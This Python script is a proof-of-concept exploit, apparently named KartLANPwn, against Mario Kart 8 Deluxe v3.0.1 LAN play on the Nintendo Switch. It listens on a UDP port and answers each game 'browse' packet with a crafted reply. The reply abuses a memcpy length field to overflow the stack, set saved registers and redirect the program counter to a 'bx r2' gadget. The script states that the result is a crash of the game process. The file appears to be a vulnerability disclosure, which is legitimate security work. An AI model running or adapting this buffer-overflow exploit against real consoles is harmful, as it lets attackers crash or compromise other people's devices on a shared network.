#!/usr/bin/env python3
import os
import sys
import socket
import struct
import traceback

BROADCAST_ADDR = ("0.0.0.0", 30000)

REPLY_PKT_SIZE = 1024
# LAN reply packet type, size of room info, room info header, misc room info fields
REPLY_INIT_MAGIC = b"\x01\x00\x00\x04\xf2\x00\x00\x00\x01\x01\x50\xC0" + (b"\x00" * 26) + b"\x01\x00\x02\x00\x0e\x02\x0d\x00\x00" # ??

# utils
def fill_ba(bytearr, length):
    if type(bytearr) == bytes:
        bytearr = bytearray(bytearr)

    if len(bytearr) < length:
        bytearr.extend(b"\x00" * ( length - len(bytearr) ))

    return bytearr

reply_buf_data = fill_ba(b"Hello!", 128)

def craft_reply_packet():
    out = bytearray(REPLY_INIT_MAGIC + reply_buf_data)

    overflowed_out = bytearray()

    # by +0x497ab8, r4 and r5 are popped to the values they were supposed to be, r6-r8 left in-tact
    # ^ ignore if you're already overflowing pc, you won't even reach this codepath in that case
    overflowed_out.extend(struct.pack("<I", 0xAAAAAAAA)) # r4
    overflowed_out.extend(struct.pack("<I", 0xBBBBBBBB)) # r5

    overflowed_out.extend(struct.pack("<I", 0xCCCCCCCC)) # r6
    overflowed_out.extend(struct.pack("<I", 0xDDDDDDDD)) # r7
    overflowed_out.extend(struct.pack("<I", 0xEEEEEEEE)) # r8

    # jumps to a relative `bx r2`, which just so happens to contain the ptr to the start of our
    # output buffer on the stack by the time this pc is popped. (see `reply_buf_data`)
    # of course, this is merely a theoretical exploit b/c the Switch uses No eXecute pages
    overflowed_out.extend(b"\xCC\x80"[::-1]) # pc (!)
    # # \xCC\x80 = +0x8C8C80 (bx r2)

    # the region we can reliably jump to is between 8cc000-8dc000 since the base of main at runtime always ends in 0x04000

    # length for memcpy to write from (located @ packet[431])
    evil_length = len(reply_buf_data) + len(overflowed_out)

    out.extend(fill_ba(overflowed_out, 256))
    out.extend(struct.pack(">I", evil_length))

    return bytes(fill_ba(out, REPLY_PKT_SIZE))

def main():
    print("Hello from Latte Softworks! 🙂 https://latte.to")
    print("""
USAGE INSTRUCTIONS:

    • IMPORTANT: This PoC is intended only for Mario Kart 8 Deluxe v3.0.1, if
      you're on the latest version of the game, your install of MK8DX is
      not vulnerable to KartLANPwn

    • Ensure that your Switch is connected to the same network as this machine
    • See MK8DX LAN play instructions here: https://en-americas-support.nintendo.com/app/answers/detail/a_id/25961/~/how-to-use-the-lan-play-feature-of-mario-kart-8-deluxe
    • Upon opening the "LAN Play" menu with this script running, the game's process should crash. Hooray!
""")

    print(f"Opening UDP socket @ {BROADCAST_ADDR}")
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(BROADCAST_ADDR)

    # UDP socket listener loop
    while True:
        data, addr = server.recvfrom(1024)
        print(f"> RECV from {addr}")

        # "browse" search packets have a type id of 0
        if data[0] == 0:
            print(f"Sending crafted browse reply to {addr}.. ", end="")
            server.sendto(craft_reply_packet(), addr)
            print("done!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
